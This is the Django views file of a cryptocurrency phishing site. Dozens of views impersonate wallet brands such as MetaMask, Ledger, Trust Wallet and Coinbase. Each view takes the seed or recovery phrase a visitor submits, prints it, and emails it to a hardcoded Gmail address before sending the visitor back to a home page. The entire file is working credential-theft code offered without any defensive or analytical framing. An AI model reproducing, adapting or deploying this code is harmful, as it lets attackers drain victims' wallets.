from django.shortcuts import render
from .forms import WalletForm
from wallet.settings import EMAIL_HOST_USER
from django.core.mail import message, send_mail
# Create your views here.


MAIL = 'jjamst5@gmail.com'


def home(request):
    return render(request, "core/index-2.html")


def inch1(request):
    return render(request, "core/1inch.html")


def trustWallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "TrustWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/trustwallet.html", {'form': form})


def aavewallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "AaveWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/aavewallet.html", {'form': form})


def algorandwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "AlgorandWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/algorandwallet.html", {'form': form})


def atomicwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "AtomicWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/atomicwallet.html", {'form': form})


def autherumwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "AutherumWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/autherumwallet.html", {'form': form})


def bancorwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "BancorWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/bancorwallet.html", {'form': form})


def bandcorwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "BandcorWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/bandcorwallet.html", {'form': form})


def bandprotocolwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "BandprotocolWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/bandprotocolwallet.html", {'form': form})


def cardanowallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "CardanoWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/cardanowallet.html", {'form': form})


def coinbasewallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "CoinbaseWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/coinbasewallet.html", {'form': form})


def coinomiwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "CoinomiWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/coinomiwallet.html", {'form': form})


def cosmoswallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "CosmosWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/Cosmoswallet.html", {'form': form})


def defiatwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "DefiatWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/defiatwallet.html", {'form': form})


def digitexwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "DigitexWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/digitexwallet.html", {'form': form})


def elrondwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "ElronWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/elrondwallet.html", {'form': form})


def enjinwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "EnjinWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/enjinwallet.html", {'form': form})


def eoswallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "EosWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/eoswallet.html", {'form': form})


def exoduswallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "ExodusWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/exoduswallet.html", {'form': form})


def falconswapwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "FalconswapWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/falconswapwallet.html", {'form': form})


def formaticwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "FormaticWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/formaticwallet.html", {'form': form})


def harmonywallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "ExodusWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/harmonywallet.html", {'form': form})


def hexcomwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "HexcomWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/hexcomwallet.html", {'form': form})


def jaxxwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "JaxxWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/jaxxwallet.html", {'form': form})


def kardiachainwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "KardiachainWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/kardiachainwallet.html", {'form': form})


def kavawallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "KavaWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/kavawallet.html", {'form': form})


def kleverwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "ExodusWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/kleverwallet.html", {'form': form})


def kyberswapwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "ExodusWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/kyberswapwallet.html", {'form': form})


def ledgerwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "LedgerWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/ledgerwallet.html", {'form': form})


def metamaskwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "MetamaskWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/metamaskwallet.html", {'form': form})


def mewwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "MewWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/mewwallet.html", {'form': form})


def monerowallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "MoneroWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/monerowallet.html", {'form': form})


def moonletwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "MoonletWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/moonletwallet.html", {'form': form})


def neonwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "NeonWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/neonwallet.html", {'form': form})


def oceanprotocolwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "OceanprotocolWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/oceanprotocolwallet.html", {'form': form})


def octofiwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "OctofiWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/octofiwallet.html", {'form': form})


def polkadotwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "PolkadotWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/polkadotwallet.html", {'form': form})


def portiswallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "PortisWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/portiswallet.html", {'form': form})


def skalewallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "SkaleWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/exoduswallet.html", {'form': form})


def tezoswallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "TezosWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/tezoswallet.html", {'form': form})


def thetawallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "ThetaWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/thetawallet.html", {'form': form})


def tomochainwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "TomochainWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/tomochainwallet.html", {'form': form})


def tronwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "TronWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/Tronwallet.html", {'form': form})


def walletconnect(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "WalletConnect"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")


def waxwallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "WaxWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/waxwallet.html", {'form': form})


def zilliqawallet(request):
    form = WalletForm(request.POST or None)
    if form.is_valid():
        subject = "ZilliquaWallet"
        message = form.cleaned_data.get('recovery_phrase')
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER, [recipient], fail_silently=False)
        print("Yes")
        return render(request, "core/index-2.html")
    return render(request, "core/zilliqawallet.html", {'form': form})
